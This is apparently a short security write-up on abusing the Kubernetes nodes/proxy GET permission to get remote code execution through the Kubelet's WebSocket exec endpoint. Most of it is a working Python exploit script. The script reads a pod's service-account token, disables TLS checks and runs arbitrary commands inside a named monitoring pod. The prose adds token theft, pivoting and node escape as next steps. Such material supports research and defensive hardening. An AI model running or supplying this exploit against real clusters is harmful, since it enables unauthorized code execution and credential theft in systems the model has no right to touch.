Abusing the Kubernetes nodes/proxy endpoint allows attackers to access Kubelet APIs and execute arbitrary commands in any pod, often bypassing standard RBAC, firewalls, and Kubernetes audit logs. This commonly affects environments where monitoring, observability, or CI/CD agents have been granted “read-only” nodes/proxy GET permissions.

The Core Attack Vector: nodes/proxy GET to RCE

While often treated by static configuration scanners and cluster operators as a safe, read-only privilege, the nodes/proxy GET permission can be weaponized into full Remote Code Execution (RCE).

How it works:

  1. Endpoint Access: The API server exposes a proxy endpoint (e.g., kubectl get --raw "/api/v1/nodes/<node-name>/proxy/pods" or /logs).
  2. WebSocket Upgrade: An attacker with this access can initiate a WebSocket connection to the Kubelet API. The Kubelet fails to distinguish between the GET permission allowed by the API server proxy and the CREATE permission strictly required for executing commands.
  3. Container Takeover: This results in unlogged, root-level code execution inside targeted pods, which can then be used to steal service account tokens, pivot through the cluster, or escape to the host node.

making a script to kube exec Link to heading 

#!/usr/bin/env python3
import asyncio
import ssl
import sys

import websockets

NODE = "10.129.50.160"
NE_NS = "monitoring"
NE_POD = "prometheus-prometheus-node-exporter-nmntq"
NE_CNT = "node-exporter"

TOKEN = open("/var/run/secrets/kubernetes.io/serviceaccount/token").read().strip()
COMMAND = sys.argv[1] if len(sys.argv) > 1 else "id"


async def ws_exec(cmd_parts):
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    args = "&".join(f"command={part}" for part in cmd_parts)
    url = (
        f"wss://{NODE}:10250/exec/{NE_NS}/{NE_POD}/{NE_CNT}"
        f"?output=1&error=1&{args}"
    )

    async with websockets.connect(
        url,
        ssl=ctx,
        additional_headers={"Authorization": f"Bearer {TOKEN}"},
        subprotocols=["v4.channel.k8s.io"],
        open_timeout=10,
    ) as ws:
        try:
            while True:
                data = await asyncio.wait_for(ws.recv(), timeout=5)
                if isinstance(data, bytes) and len(data) > 1:
                    sys.stdout.write(data[1:].decode("utf-8", errors="replace"))
                    sys.stdout.flush()
        except (asyncio.TimeoutError, websockets.exceptions.ConnectionClosed):
            pass


asyncio.run(ws_exec(COMMAND.split()))
